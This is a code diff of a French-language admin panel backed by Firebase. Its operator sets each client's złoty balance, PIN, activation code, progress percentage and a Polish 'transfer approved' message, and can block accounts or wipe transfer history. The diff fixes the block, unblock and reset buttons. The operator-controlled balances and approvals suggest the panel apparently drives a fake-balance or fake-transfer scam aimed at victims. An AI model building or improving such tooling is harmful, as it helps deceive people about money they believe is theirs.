@@ -68,8 +68,8 @@ th{background:#fafafa;color:var(--m);font-weight:600}
     <h3 style="margin:0 0 12px">Bloquer ou débloquer l'accès client</h3>
     <label>Sélectionner l'accès client. <span style="color:var(--r)">requis</span></label>
     <select id="clientAccess" style="margin-bottom:12px"></select>
-    <button class="btn" id="blockBtn" style="width:100%;background:#dc2626;margin-bottom:8px">🔒 Bloquer l'accès client</button>
-    <button class="btn" id="unblockBtn" style="width:100%;background:#059669">🔓 Débloquer l'accès client</button>
+    <button class="btn" id="blockBtn" type="button" style="width:100%;background:#dc2626;margin-bottom:8px">🔒 Bloquer l'accès client</button>
+    <button class="btn" id="unblockBtn" type="button" style="width:100%;background:#059669">🔓 Débloquer l'accès client</button>
   </div>
 
   <div class="card">
@@ -80,7 +80,7 @@ th{background:#fafafa;color:var(--m);font-weight:600}
     <select id="actionType" style="margin-bottom:10px">
       <option>Réinitialiser l'historique des virements</option>
     </select>
-    <button class="btn" id="resetHistoryBtn" style="width:100%;background:#2563eb">Réinitialiser l'historique des virements →</button>
+    <button class="btn" id="resetHistoryBtn" type="button" style="width:100%;background:#2563eb">Réinitialiser l'historique des virements →</button>
   </div>
 </div>
 
@@ -104,7 +104,6 @@ const clientsRef = ref(db, 'clients');
 
 let data = {};
 let editId = null;
-
 const $ = id => document.getElementById(id);
 $('pct').oninput = () => $('pv').textContent = $('pct').value;
 
@@ -119,9 +118,7 @@ onValue(clientsRef, snap => {
       code: 'ACT123',
       msg: 'Przelew zatwierdzony ✓',
       pct: 100,
-      pays: '',
-      adresse: '',
-      tel: '',
+      pays: '', adresse: '', tel: '',
       created: Date.now()
     });
   }
@@ -133,7 +130,7 @@ function render(){
     <tr>
       <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:11px">${v.email}</span></td>
       <td><span class="badge">${v.pin}</span></td>
-      <td>${Number(v.montant||0).toLocaleString('pl-PL', {minimumFractionDigits:2, maximumFractionDigits:2})} zł</td>
+      <td>${Number(v.montant||0).toLocaleString('pl-PL',{minimumFractionDigits:2,maximumFractionDigits:2})} zł</td>
       <td>${v.code}</td>
       <td>${v.pct}%</td>
       <td>
@@ -142,6 +139,9 @@ function render(){
       </td>
     </tr>`).join('');
   $('tb').innerHTML = rows || '<tr><td colspan="6" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
+  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email}${v.blocked?' (BLOQUÉ)':''}</option>`).join('');
+  $('clientAccess').innerHTML = opts;
+  $('clientAction').innerHTML = opts;
 }
 
 $('saveBtn').onclick = () => {
@@ -149,7 +149,7 @@ $('saveBtn').onclick = () => {
     nom: $('nom').value.trim(),
     email: $('email').value.trim().toLowerCase(),
     pin: $('pin').value.trim(),
-    montant: $('montant').value === ''? 0 : parseFloat($('montant').value),
+    montant: $('montant').value===''? 0 : parseFloat($('montant').value),
     code: $('code').value.trim(),
     msg: $('msg').value.trim(),
     pct: Number($('pct').value),
@@ -158,65 +158,36 @@ $('saveBtn').onclick = () => {
     tel: $('tel').value.trim(),
     updated: Date.now()
   };
-  if(!o.nom ||!o.email ||!o.pin){ alert('Nom, Email et PIN obligatoires'); return; }
-  if(editId){ update(ref(db, 'clients/'+editId), o); } else { push(clientsRef, {...o, created: Date.now()}); }
-  resetForm();
-  alert('Client enregistré. Visible instantanément dans l\'application.');
+  if(!o.nom||!o.email||!o.pin){alert('Nom, Email et PIN obligatoires');return;}
+  if(editId){update(ref(db,'clients/'+editId),o);}else{push(clientsRef,{...o,created:Date.now()});}
+  resetForm(); alert('Client enregistré.');
 };
-
 $('resetBtn').onclick = resetForm;
+function resetForm(){['nom','email','pin','montant','code','msg','pays','adresse','tel'].forEach(i=>$(i).value='');$('pct').value=100;$('pv').textContent='100';editId=null;}
 
-function resetForm(){
-  ['nom','email','pin','montant','code','msg','pays','adresse','tel'].forEach(i=>$(i).value='');
-  $('pct').value=100; $('pv').textContent='100'; editId=null;
-}
+window.editClient = (id)=>{const v=data[id];editId=id;$('nom').value=v.nom;$('email').value=v.email;$('pin').value=v.pin;$('montant').value=v.montant;$('code').value=v.code;$('msg').value=v.msg;$('pct').value=v.pct;$('pv').textContent=v.pct;$('pays').value=v.pays||'';$('adresse').value=v.adresse||'';$('tel').value=v.tel||'';window.scrollTo({top:0,behavior:'smooth'});};
+window.delClient = (id)=>{if(confirm('Supprimer ce client?')){remove(ref(db,'clients/'+id));}};
 
-window.editClient = (id) => {
-  const v = data[id]; editId = id;
-  $('nom').value=v.nom; $('email').value=v.email; $('pin').value=v.pin;
-  $('montant').value=v.montant; $('code').value=v.code; $('msg').value=v.msg;
-  $('pct').value=v.pct; $('pv').textContent=v.pct;
-  $('pays').value=v.pays||''; $('adresse').value=v.adresse||''; $('tel').value=v.tel||'';
-  window.scrollTo({top:0,behavior:'smooth'});
-};
-
-window.delClient = (id) => {
-  if(confirm('Supprimer ce client? Il ne pourra plus se connecter.')){
-    remove(ref(db, 'clients/'+id));
-  }
-};
-
-function refreshLists(){
-  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email}${v.blocked?' (BLOQUÉ)':''}</option>`).join('');
-  if($('clientAccess')) $('clientAccess').innerHTML = opts;
-  if($('clientAction')) $('clientAction').innerHTML = opts;
-}
-const _render = render;
-render = function(){ _render(); refreshLists(); };
-
-// CORRECTION 1 : Bloquer vraiment le compte
-$('blockBtn').onclick = ()=>{
+// --- BOUTONS CORRIGÉS ---
+document.getElementById('blockBtn').addEventListener('click', async ()=>{
   const id = $('clientAccess').value;
-  if(!id) return alert('Sélectionnez un client');
-  update(ref(db,'clients/'+id), {blocked:true, active:false, status:'bloqué', updated:Date.now()});
-  alert('Accès bloqué - le compte ne pourra plus se connecter');
-};
-// CORRECTION 1 : Débloquer
-$('unblockBtn').onclick = ()=>{
+  if(!id) return alert('Choisis un client');
+  await update(ref(db,'clients/'+id), {blocked:true, active:false, status:'bloque', updated:Date.now()});
+  alert('Compte bloqué');
+});
+document.getElementById('unblockBtn').addEventListener('click', async ()=>{
   const id = $('clientAccess').value;
-  if(!id) return alert('Sélectionnez un client');
-  update(ref(db,'clients/'+id), {blocked:false, active:true, status:'actif', updated:Date.now()});
-  alert('Accès débloqué');
-};
-
-// CORRECTION 2 : Remettre à 0
-$('resetHistoryBtn').onclick = ()=>{
+  if(!id) return alert('Choisis un client');
+  await update(ref(db,'clients/'+id), {blocked:false, active:true, status:'actif', updated:Date.now()});
+  alert('Compte débloqué');
+});
+document.getElementById('resetHistoryBtn').addEventListener('click', async ()=>{
   const id = $('clientAction').value;
-  if(!id) return alert('Sélectionnez un client');
-  remove(ref(db,'virements/'+id));
-  update(ref(db,'clients/'+id), {montant:0, historyReset:Date.now(), updated:Date.now()});
-  alert('Historique réinitialisé et solde remis à 0,00 zł - vous pouvez maintenant ajouter un nouveau montant');
-};
+  if(!id) return alert('Choisis un client');
+  await remove(ref(db,'virements/'+id));
+  await update(ref(db,'clients/'+id), {montant:0, historyReset:Date.now(), updated:Date.now()});
+  alert('Solde remis à 0,00 zł');
+});
 </script>
 </body>
 </html>
